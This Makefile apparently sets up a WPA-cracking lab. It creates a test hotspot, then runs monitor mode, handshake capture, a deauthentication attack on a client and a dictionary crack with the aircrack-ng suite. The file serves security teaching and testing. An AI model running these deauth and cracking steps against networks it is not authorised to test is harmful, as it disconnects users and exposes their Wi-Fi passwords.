AP_INTERFACE=wlx00c0caabaa8c
AP_BSSID=00:C0:CA:AB:AA:8C
AP_SSID=LAB_WIFI_WPA
AP_CON=LAB_WIFI_WPA_CON
AP_PWD=LAB_WIFI_WPA_PWD
AP_CH=6

STA_MAC=C0:EE:FB:F8:6D:F2

ATK_INTERFACE=wlxb8eca3d9d777
ATK_DICT=dictionnary.txt

create_wpa_network:
	nmcli device set $(AP_INTERFACE) managed yes
	nmcli device wifi hotspot ifname $(AP_INTERFACE) con-name $(AP_CON) ssid $(AP_SSID) band bg channel $(AP_CH) password $(AP_PWD)

enable_monitor_mode:
	nmcli device set $(ATK_INTERFACE) managed no
	sudo airmon-ng start $(ATK_INTERFACE)

capture_4way_handshake:
	sudo airodump-ng -c $(AP_CH) -N $(AP_SSID) -a -w capture $(ATK_INTERFACE)

send_deauth:
	sudo aireplay-ng -a $(AP_BSSID) -c $(STA_MAC) -0 1 $(ATK_INTERFACE)

crack_wpa:
	sudo aircrack-ng -w $(ATK_DICT) -e $(AP_SSID) capture*.cap

clean:
	rm -rf capture*.cap capture*.csv capture*.netxml
